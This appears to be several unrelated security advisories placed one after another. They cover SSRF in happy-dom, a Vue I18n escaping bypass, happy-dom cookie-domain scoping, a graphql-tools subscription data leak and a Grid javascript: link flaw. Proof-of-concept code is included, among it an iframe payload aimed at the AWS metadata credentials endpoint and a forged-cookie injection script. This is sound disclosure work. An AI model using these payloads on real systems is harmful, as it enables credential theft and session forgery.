## Summary
happy-dom v20.8.9 makes real server-side HTTP requests to arbitrary URLs when parsing HTML containing `<iframe>` or `<link rel="stylesheet">` elements. This behavior is enabled by default (`disableIframePageLoading: false`, `disableCSSFileLoading: false`). When an application uses happy-dom to parse untrusted HTML on the server side, an attacker can trigger Server-Side Request Forgery by embedding these elements.

## Affected Versions
- happy-dom <= 20.8.9 (latest)

## Vulnerable Behavior

By default, happy-dom has:
- `disableIframePageLoading: false` — iframes fetch their `src` URL via real HTTP requests
- `disableCSSFileLoading: false` — `<link>` stylesheets fetch their `href` URL via real HTTP requests

When untrusted HTML is parsed, these elements trigger real server-side HTTP requests to whatever URLs are specified. No special configuration or opt-in is needed.

## Proof of Concept

### Verified test (attacker server receives requests):
```javascript
const http = require('http');
const { Window } = require('happy-dom');

// Start attacker server
const srv = http.createServer((req, res) => {
    console.log(`SSRF HIT: ${req.method} ${req.url}`);
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('<html><body>stolen</body></html>');
});

srv.listen(9995, () => {
    // iframe SSRF — happy-dom makes a real GET request
    const win1 = new Window({ url: 'http://localhost' });
    win1.document.write('<html><body><iframe src="http://127.0.0.1:9995/iframe-ssrf"></iframe></body></html>');

    // stylesheet SSRF — happy-dom makes a real GET request
    const win2 = new Window({ url: 'http://localhost' });
    win2.document.write('<html><head><link rel="stylesheet" href="http://127.0.0.1:9995/stylesheet-ssrf"></head><body></body></html>');
});
```

**Test output:**
```
SSRF HIT: GET /iframe-ssrf
SSRF HIT: GET /stylesheet-ssrf
```

Both requests confirmed received by the attacker server. Tested on happy-dom v20.8.9, Node.js v22.17.0, macOS.

### Cloud metadata attack scenario:
```javascript
const { Window } = require('happy-dom');
const win = new Window({ url: 'http://localhost' });

// Attacker-controlled HTML triggers fetch to AWS metadata endpoint
win.document.write('<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe></body></html>');
```

## Impact
- **Cloud credential theft** — `<iframe src="http://169.254.169.254/...">` fetches AWS/GCP/Azure metadata
- **Internal network scanning** — probe internal services and ports
- **Data exfiltration** — read responses from internal APIs
- **Affects any server-side use case** — web scraping, email HTML rendering, SSR, testing with external HTML input

## Suggested Fix
Change defaults to disable external resource loading:
```javascript
disableIframePageLoading: true,  // change from false
disableCSSFileLoading: true,     // change from false
```

Or add URL validation to block private IP ranges and cloud metadata endpoints before fetching.

### Summary

When `escapeParameter` is enabled (`escapeParameterHtml` in the Legacy API), Vue I18n escapes the interpolation parameters before formatting a message. `escapeParams()` escapes either the list values or the named values, but not both: the two branches are joined by `else`. When a single call passes both, for example `t(key, ['...'], { named: { ... } })`, the named values reach the message without being escaped.

### Details

`escapeParams()` in [`packages/core-base/src/translate.ts` (v11.4.13)](https://github.com/intlify/vue-i18n/blob/v11.4.13/packages/core-base/src/translate.ts):

```ts
function escapeParams(options: TranslateOptions) {
  if (isArray(options.list)) {
    options.list = options.list.map(item => (isString(item) ? escapeHtml(item) : item))
  } else if (isObject(options.named)) {
    // ...escapes the named values
  }
}
```

`t(key, list, options)` is a public overload, and `TranslateOptions` has a `named` field, so a call can carry both. The list is checked first, and the named values are then left as they are.

The translated string still goes through `sanitizeTranslatedHtml()` (added for CVE-2025-53892), which neutralizes event handler attributes and `javascript:` URLs. Other markup in the named values, such as links and forms, is inserted as is. Before the fix for GHSA-83rm-6c8r-g728, an `<iframe srcdoc>` in a named value also passes the sanitizer, and script runs. Versions without the sanitizer (before 9.14.5, 10.0.8 and 11.1.10, and 12.0.0-alpha.1 to alpha.3) insert the named values as HTML without any further check.

`<i18n-t>` is not affected: it passes either list or named values, never both, and it does not render translations as HTML.

### PoC

```js
import { createI18n } from 'vue-i18n'

const i18n = createI18n({
  legacy: false,
  locale: 'en',
  escapeParameter: true,
  messages: {
    en: { withList: '{0} {name}', withoutList: '{name}' }
  }
})
const t = i18n.global.t

t('withoutList', { name: '<b>x</b>' })
// &lt;b&gt;x&lt;&#x2F;b&gt;      escaped

t('withList', ['a'], { named: { name: '<b>x</b>' } })
// a <b>x</b>                   not escaped (v11.4.13)
```

### Impact

Applications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and pass untrusted named values in the same call as a list. The named values are inserted as markup: phishing links, forms, or layout changes. Together with GHSA-83rm-6c8r-g728, or on versions without the sanitizer, this leads to script execution (DOM-based XSS).

### Patches

Fixed in 11.4.14 and 12.0.0-alpha.5. `escapeParams()` now escapes both the list and the named values.

The fix also stops rewriting the named object that the caller passes. Before, the values of that object were replaced with their escaped form, so a second call with the same object escaped them twice.

v9 and v10 are no longer supported and will not be fixed. Please migrate to v11.

### Workarounds

- Do not pass list and named values in the same call when `escapeParameter` is enabled.
- Do not render translations that can contain untrusted values with `v-html`. Use component interpolation (`<i18n-t>`) instead.

### Summary
A cookie-scoping bug in happy-dom lets an attacker origin set cookies that a victim origin then receives, diverging from browser semantics.

### Details
happy-dom matches Domain=example.com against notexample.com (endsWith without a DNS-label boundary), diverging from browser semantics (verified 20.11.6 npm latest: cookieMatchesURL(Domain=example.com, url=http://notexample.com) = true). Relevant where happy-dom is used for SSR/prerender cookie handling. Matching in src/cookie/CookieContainer.ts.

### PoC

Run:
```bash
node poc-happydom-cookie-domain.js
```

Full proof-of-concept source (poc-happydom-cookie-domain.js):
```js
// PoC: happy-dom cookie-domain scoping gap -> cross-origin cookie injection / session fixation
// Chain: app (window at http://localhost:PORT2) fetches attacker server (http://127.0.0.1:PORT1)
//        -> attacker Set-Cookie with Domain=localhost (a host that is NOT a suffix of 127.0.0.1)
//        -> happy-dom stores it (a real browser rejects: RFC 6265 §5.3.6-7 + PSL)
//        -> app's same-origin fetch to http://localhost:PORT2/api/account carries the forged cookie
// Run:  cd C:/Users/rncb0/AppData/Local/Temp/0day && node poc/poc-happydom-cookie-domain.js
const http = require('http');
const { Window } = require('happy-dom');

const ATK_PORT = 19311; // attacker server, 127.0.0.1
const VIC_PORT = 19312; // victim server, localhost

let victimReceivedCookies = [];

let attackerSetCookie = `session=FORGED_BY_ATTACKER; Domain=localhost; Path=/; SameSite=None; Secure`;

const attacker = http.createServer((req, res) => {
  if (req.method === 'OPTIONS') {
    // CORS preflight (happy-dom enforces same-origin policy with a preflight; the
    // attacker trivially answers it — an attacker-controlled server always can)
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    });
    res.end();
    return;
  }
  res.writeHead(200, {
    'content-type': 'image/gif',
    'Access-Control-Allow-Origin': '*',
    // Attacker claims Domain=localhost even though it is serving from 127.0.0.1.
    // A browser MUST ignore this cookie (RFC 6265: domain-attribute not a domain-match of
    // the request-host; localhost is also on the Mozilla PSL).
    'Set-Cookie': attackerSetCookie
  });
  res.end('GIF89a');
});

const victim = http.createServer((req, res) => {
  victimReceivedCookies.push({ path: req.url, cookie: req.headers['cookie'] || null });
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify({ ok: true, user: 'alice' }));
});

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

async function runScenario(scenario) {
  victimReceivedCookies = [];
  const win = new Window({
    url: `http://localhost:${VIC_PORT}/`,
    settings: {
      enableJavaScriptEvaluation: true,
      suppressInsecureJavaScriptEnvironmentWarning: true
    }
  });
  try {
    if (scenario === 'no-plant-control') {
      // Control: app NEVER contacts attacker -> victim must receive NO cookie
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    } else if (scenario === 'honest-domain-control') {
      // Control: attacker sets Domain=127.0.0.1 (its own host, honest)
      // -> cookie must NOT leak to localhost victim
      attackerSetCookie = `session=FORGED_BY_ATTACKER; Domain=127.0.0.1; Path=/; SameSite=None; Secure`;
      await win.fetch(`http://127.0.0.1:${ATK_PORT}/plant`);
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    } else {
      // attack: app fetches attacker content (scraping/SSR/third-party resource)
      await win.fetch(`http://127.0.0.1:${ATK_PORT}/plant`);
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    }
    await sleep(150);
    return victimReceivedCookies;
  } finally {
    win.happyDOM.abort();
  }
}

async function main() {
  await new Promise((r) => attacker.listen(ATK_PORT, '127.0.0.1', r));
  await new Promise((r) => victim.listen(VIC_PORT, 'localhost', r));

  console.log('=== happy-dom cookie-domain scoping PoC ===\n');

  const attack = await runScenario('attack');
  console.log('[ATTACK] app fetched attacker (127.0.0.1) then victim (localhost)');
  attack.forEach((e) => console.log(`  victim got ${e.path}: Cookie=${JSON.stringify(e.cookie)}`));
  const forged = attack.some((e) => e.cookie && e.cookie.includes('session=FORGED_BY_ATTACKER'));
  console.log(`  -> forged cookie delivered to victim: ${forged ? 'YES (VULNERABLE)' : 'no'}`);

  const noPlant = await runScenario('no-plant-control');
  console.log('\n[CONTROL] app never contacts attacker');
  noPlant.forEach((e) => console.log(`  victim got ${e.path}: Cookie=${JSON.stringify(e.cookie)}`));

  const honest = await runScenario('honest-domain-control');
  console.log('\n[CONTROL] attacker sets honest Domain=127.0.0.1 only');
  honest.forEach((e) => console.log(`  victim got ${e.path}: Cookie=${JSON.stringify(e.cookie)}`));

  // unit proof: document.cookie setter also accepts non-suffix domains (browser rejects)
  const win2 = new Window({
    url: `http://localhost:${VIC_PORT}/`,
    settings: { enableJavaScriptEvaluation: true, suppressInsecureJavaScriptEnvironmentWarning: true }
  });
  win2.document.cookie = `admin=1; Domain=com; Path=/`; // PSL public suffix!
  const readBack = win2.document.cookie;
  console.log(`\n[UNIT] document.cookie = 'admin=1; Domain=com' -> read back: '${readBack}'`);
  console.log(`  -> browser: REJECTED (public suffix); happy-dom: ${readBack.includes('admin=1') ? 'ACCEPTED' : 'rejected'}`);
  win2.happyDOM.abort();

  // unit proof: endsWith boundary bug (SameSite=None cookie -> sent to any host ending with the domain)
  const { default: CookieURLUtility } = require('happy-dom/lib/cookie/urilities/CookieURLUtility.js');
  const matchesBoundary = CookieURLUtility.cookieMatchesURL(
    { key: 'k', value: 'v', originURL: new URL('http://attacker.example/'), domain: 'example.com', path: '/', secure: true, sameSite: 'None' },
    new URL('https://notexample.com/')
  );
  console.log(`\n[UNIT] cookieMatchesURL(Domain=example.com, SameSite=None, url=http://notexample.com) = ${matchesBoundary}`);
  console.log(`  -> 'notexample.com'.endsWith('example.com') is TRUE (no DNS-label boundary); browser: no match`);

  attacker.close();
  victim.close();
  process.exit(0);
}

main().catch((e) => { console.error(e); process.exit(1); });

```

Observed output (verbatim, Node 24.15.0, Windows):
```
[UNIT] cookieMatchesURL(Domain=example.com, SameSite=None, url=http://notexample.com) = true
  -> 'notexample.com'.endsWith('example.com') is TRUE (no DNS-label boundary); browser: no match
```

### Impact
Cookie-scoping divergence / session forgery . Applications using happy-dom for SSR/prerender cookie handling can accept cookies from wrong origins. Affects happy-dom <= 20.14.5. Note: main pushback will be that happy-dom is a test DOM — state the SSR use case.

# Cross-tenant subscription data leak in `@graphql-tools/executor-legacy-ws`: a shared `websocket.onmessage` is replaced on every `subscribe()`, and `DATA` frames are delivered without checking the protocol operation id

## Report metadata

| Field | Value |
| --- | --- |
| Package | `@graphql-tools/executor-legacy-ws` (npm, `pkg:npm/%40graphql-tools/executor-legacy-ws`) |
| Repository | https://github.com/ardatan/graphql-tools |
| Component | `buildWSLegacyExecutor` → the returned executor's `subscribe(observer)` / `websocket.onmessage` handler |
| Vulnerability class | Cross-tenant data leak (subscription results delivered to the wrong caller) |
| Verified against | Source at `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1` (package version 1.1.33); published npm tarball `1.1.33` with matching source at `d304214db06e8a4ce9cb41138f199e3bc6ed36f2`; the same behaviour also reproduces on the current release `1.1.35` |
| API surface | Public documented API (`buildWSLegacyExecutor`) |
| Affected in default configuration | Yes — `ensureWebsocket()` reuses an already-`OPEN` socket (`index.ts:35-42`), and the socket has a single mutable `onmessage` property (`index.ts:113`). No single-operation-only restriction is documented, and the return type is the general reusable `DisposableExecutor` (`packages/utils/src/executor.ts:34-57`) |

Affected version range: the range recorded for this finding is `<= 1.1.33`, but that is understated — the same proof of concept reproduces on `1.1.35`, and a byte diff of the built CJS output between `1.1.33` and `1.1.35` shows only one unrelated change (`rejectUnauthorized`).

## Summary

`buildWSLegacyExecutor` keeps one WebSocket in closure state and installs the message handler by assigning to the socket's single `websocket.onmessage` property inside `subscribe()`. Every new subscription therefore overwrites the previous subscriber's handler, and the handler's `case LEGACY_WS.DATA` branch calls `observer.next(data.payload)` without ever comparing `data.id` to the operation id that this subscription created at line 103 and sent with `START` at line 123. When one executor instance is reused for overlapping subscriptions, the most recent caller receives payloads belonging to the earlier caller, and the earlier caller receives nothing.

In a consuming application, the tainted input is an ordinary, correctly-tagged `DATA` frame emitted by the legitimate downstream server for the victim's operation. The attacker does not need to control or compromise that server; they only need to be able to start their own subscription through the same shared executor while the victim's subscription is active — the natural shape of a gateway, stitched schema, or any service that builds a remote executor once and reuses it per request.

The surrounding code shows the inconsistency:

- `packages/loaders/url/src/index.ts:262-295` (in-repo `UrlLoader` wrapper) → constructs a fresh legacy executor inside each request, so that caller avoids the shared state.
- `buildWSLegacyExecutor`'s returned executor, reused across callers → **unsafe: shared `onmessage` overwritten at line 113, `DATA` dispatched without an id check at lines 145-147**.
- `packages/loaders/url/src/index.ts:172-182` → also a production caller of the legacy executor; safe only insofar as the wrapper above rebuilds the executor per request, not because of any check in the executor itself.

## Impact

A user of a service that shares one legacy executor receives another user's private GraphQL subscription payloads verbatim, with the victim's authorization context, without ever having been authorized for that operation. The victim is simultaneously starved: their own iterator stops receiving the events they subscribed to, because their handler has been detached.

Without this bug, the attacker's observer would receive only results for their own operation — and in this implementation, no result at all, since their operation is never `START`ed after `CONNECTION_ACK` has already fired. The new capability is therefore reading data the attacker could not otherwise obtain by any request they are permitted to make, plus a denial of the victim's subscription stream.

Scoring note: no CVSS vector was computed for this finding, because exploitability depends on the consuming application's data flow — specifically whether one executor instance is shared across mutually untrusted callers. Consumers that construct a new executor per operation (as the in-repo `UrlLoader` wrapper does at `packages/loaders/url/src/index.ts:262-295`) are not affected by the cross-caller leak. The set of affected downstream consumers has not been enumerated: **unknown**.

## Preconditions

1. One executor value returned by `buildWSLegacyExecutor` is reused rather than constructing a new executor per operation. This is the normal use of an `Executor`: the contract is invoked once per `ExecutionRequest`, the code explicitly reuses an `OPEN` socket, and the returned value holds `Symbol.dispose`.
2. Two subscription iterators overlap on an already-`OPEN` socket. The deciding default is in `ensureWebsocket()` (`packages/executors/legacy-ws/src/index.ts:35-42`), which does not create a second socket when one is open, combined with the single mutable `websocket.onmessage` assignment at line 113.
3. The attacker can cause their own subscription request to be made through that shared executor while the victim's subscription is active and acknowledged. They do not need any control over the downstream server.
4. Downstream subscription results differ by user or authorization context, so a misrouted payload is actually a disclosure.

This does **not** require non-standard usage, monkey-patching, or unusual configuration. `packages/executors/legacy-ws/src/index.ts` documents no single-operation-only restriction, the return type is the general reusable `DisposableExecutor` (`packages/utils/src/executor.ts:34-57`), and the behaviour is not documented as a caller responsibility.

## Data flow

1. **Source** — a legitimate `DATA` message emitted by the downstream server for *another* operation on the shared WebSocket. The victim invokes the returned executor, and `subscribe()` installs a closure over the victim's observer and request as `websocket.onmessage` ([`packages/executors/legacy-ws/src/index.ts:90-113`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L90-L113)).
2. **Propagation** — the server's `CONNECTION_ACK` starts the victim's operation with `id`, created at line 103 and sent with `START` at line 123 ([`packages/executors/legacy-ws/src/index.ts:116-135`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L116-L135)).
3. **Sink** — the attacker invokes the same executor while `websocket.readyState` is `OPEN`; `ensureWebsocket()` does not create a new socket and `subscribe()` replaces the sole `websocket.onmessage` with the attacker's closure ([`index.ts:35-42`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L35-L42), [`index.ts:109-113`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L109-L113)). The server's `DATA` frame for the victim carries the victim's operation id per the legacy protocol, but the handler ignores `data.id` and calls `observer.next(data.payload)` on the attacker's observer ([`index.ts:114-147`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L114-L147)).
4. **Reachability** — the sink sits in the only `subscribe` path of the executor produced by the directly exported `buildWSLegacyExecutor` ([`index.ts:27-31`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L27-L31)). `packages/loaders/url/src/index.ts:172-182` is a production caller in this repository; direct library consumers reach it by building a remote executor once and reusing it.

## Vulnerable code

`packages/executors/legacy-ws/src/index.ts`, lines 103-167 at `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1`:

```ts
const id = Date.now().toString();
return observableToAsyncIterable({
  subscribe(observer) {
    ensureWebsocket();
    ...
    websocket.onmessage = event => {           // sole handler: overwritten by every new subscribe()
      const data = JSON.parse(event.data.toString('utf-8'));
      switch (data.type) {
        ...
        case LEGACY_WS.DATA: {
          observer.next(data.payload);         // SINK: data.id is never compared with id
          break;
        }
      }
    };
  },
});
```

Two independent defects are visible here: the single mutable `onmessage` assignment (which detaches the earlier subscriber), and the missing `data.id === id` check in the `DATA` branch (which misroutes the payload). The operation id itself is also derived from `Date.now()`, so it is not collision-resistant.

## Reproduction

Verified dynamically against the real published package `@graphql-tools/executor-legacy-ws@1.1.33` (npm tarball with matching source at `d304214db06e8a4ce9cb41138f199e3bc6ed36f2`). The harness was a protocol-correct legacy `graphql-ws` server (ws v8) that tags every `DATA` frame with the operation id of the operation that produced it, plus two callers sharing one executor instance.

- **Scenario A (control, single subscription):** the subscriber received its own payload, confirming the harness is sound.
- **Scenario B (the claim):** caller 1 ("victim") subscribed; the server ACKed and the client sent `start id=1790247741390`. Caller 2 ("attacker") then invoked the **same** executor while `readyState` was `OPEN`. The server observed only one socket (`ensureWebsocket` reused it) and only one started operation — the attacker's operation was never started, because `CONNECTION_ACK` had already fired. The server then emitted a correctly-tagged `DATA` frame for the victim's id. The attacker's iterator received `{"data":{"victimSecret":"VICTIM-PRIVATE-DATA-a1b2c3"}}` and the victim's iterator received nothing.
- **Scenario C:** a `DATA` frame tagged with the id `"id-that-was-never-started"` was still delivered to the subscriber, proving the protocol operation id is never validated.
- **Realistic wiring:** with the executor wired into `wrapSchema()` the way a stitching gateway does, two concurrent users subscribing to the same field produced a verbatim cross-tenant leak — User B received `{"data":{"accountBalance":"USER-A-PRIVATE-BALANCE-$91402.11"}}` while User A received nothing. When the two users select different fields, the wrap layer's result transform masks the foreign field (B saw `weather:null`), but the misrouting still occurs and the victim is still starved; at the raw executor API the payload leaks verbatim regardless.
- **Causality control:** patching only the `DATA` branch to check `data.id === id` eliminated the leak (the attacker received nothing, and the foreign-id frame was rejected), pinning the leak to the missing id check. Under that patch the victim still received nothing, confirming the second, independent defect: the single shared `websocket.onmessage` is overwritten on each `subscribe()`, detaching the earlier subscriber's handler entirely.
- **Scope caveat:** the identical proof of concept also reproduces on the current latest release `1.1.35`.

Minimal client-side shape:

```ts
import WebSocket from 'isomorphic-ws';
import { parse } from 'graphql';
import { buildWSLegacyExecutor } from '@graphql-tools/executor-legacy-ws';

const exec = buildWSLegacyExecutor('ws://localhost:8081/graphql', WebSocket);

const victim = exec({ document: parse('subscription { privateEvent { secret } }') });
const victimPending = victim.next(); // causes connection + START; wait until the server has ACKed
await new Promise(r => setTimeout(r, 100));

const attacker = exec({ document: parse('subscription { publicEvent { id } }') });
const attackerPending = attacker.next(); // overwrites socket.onmessage

// When the server now emits DATA for the victim's id, this prints the victim's secret.
console.log(await attackerPending);
```

Steps:

1. Start a normal legacy `subscriptions-transport-ws` server with a private event subscription.
2. Build one executor and call `victimIterator.next()` so the socket receives `connection_ack` and `START` for the victim.
3. While that socket is `OPEN`, call `attackerIterator.next()` using the same executor.
4. Emit one victim event from the server.

- **Expected:** a `DATA` frame is delivered only to the observer registered for `data.id`; the attacker's pending `next()` must never resolve with the victim's payload, and the victim keeps receiving their own events.
- **Actual:** the attacker's `next()` resolves with the victim's payload, and the victim's iterator receives nothing.

## Suggested remediation

Dispatch protocol frames by operation id to the observer that started that operation, instead of routing every frame to whichever subscriber most recently overwrote the socket's sole `onmessage` handler.

```ts
// 1. Stop the misrouting: ignore frames that belong to another operation.
case LEGACY_WS.DATA: {
  if (data.id !== id) {
    break;
  }
  observer.next(data.payload);
  break;
}
```

```ts
// 2. Stop the handler overwrite: keep a registry of observers keyed by operation id
//    and install exactly one shared message listener for the socket.
const observers = new Map<string, Observer<any>>();

function ensureMessageHandler() {
  if (messageHandlerInstalled) return;
  messageHandlerInstalled = true;
  websocket.onmessage = event => {
    const data = JSON.parse(event.data.toString('utf-8'));
    const target = data.id != null ? observers.get(data.id) : undefined;
    // ... dispatch DATA / ERROR / COMPLETE to `target` only, and remove it on COMPLETE
  };
}
```

An alternative that keeps the current structure is to create a separate socket (and therefore a separate listener) per execution, as the in-repo `UrlLoader` wrapper effectively does today.

Notes:

- The same id check is needed on the `ERROR` and `COMPLETE` branches, not just `DATA`; otherwise one operation's termination still tears down another's iterator.
- The operation id is generated as `Date.now().toString()` (line 103), which is not collision-resistant — two subscriptions created in the same millisecond would share an id even after the dispatch fix. Use a counter or a random component.
- The missing id check and the overwritten `onmessage` are two independent defects; fixing only the id check stops the leak but leaves the earlier subscriber permanently starved, as the causality control above showed.
- `packages/loaders/url/src/index.ts:262-295` already builds a fresh legacy executor inside each request, so that caller needs no change; the fix belongs in the executor itself, because the exported `buildWSLegacyExecutor` returns a general reusable `DisposableExecutor`.
- No upstream advisory (CVE/GHSA), fix commit, or fixed version is known for this issue: **unknown / not verified**. The set of affected downstream consumers has likewise not been enumerated.

Suggested regression test alongside the existing `packages/executors/legacy-ws` test suite: with one executor shared by two overlapping subscriptions on an `OPEN` socket, assert that a `DATA` frame tagged with subscription A's operation id resolves only A's iterator and never B's, and that a `DATA` frame tagged with an id that was never started is dropped rather than delivered to the most recent subscriber.

## Resolution

Fixed in `@graphql-tools/executor-legacy-ws@1.1.36`, which is published on npm. Each execution has its own socket, and `data`, `error`, and `complete` frames are delivered only when the protocol operation id matches. Upgrade to `>=1.1.36`.

### Impact
An attacker who controls the Grid configuration can set `credits.href` to a `javascript:` URL. The value is not validated against an allowed-scheme list before it is applied to the credits link, so activating that link runs attacker-supplied script in the origin of the page hosting the Grid. Exploitation requires that untrusted data reach the Grid configuration and that a user activate the credits link. Script running this way has the same access to page data, storage and session state as the hosting application.

### Workarounds
Paste in after the Grid Pro module is imported, before a Grid is created.

```javascript
const { AST } = Grid;

function sanitize(options) {
    const credits = options && options.credits;

    if (credits && typeof credits.href === 'string') {
        const filtered = AST.filterUserAttributes({ href: credits.href });

        if (!filtered.href) {
            delete credits.href;
        }
    }

    return options;
}

// Both Grid.grid() and grid.update() funnel through loadUserOptions, so one
// hook covers both entry points.
const { prototype } = Grid.Grid;
const loadUserOptions = prototype.loadUserOptions;

prototype.loadUserOptions = function (options, ...rest) {
    sanitize(options);
    return loadUserOptions.call(this, options, ...rest);
};
```

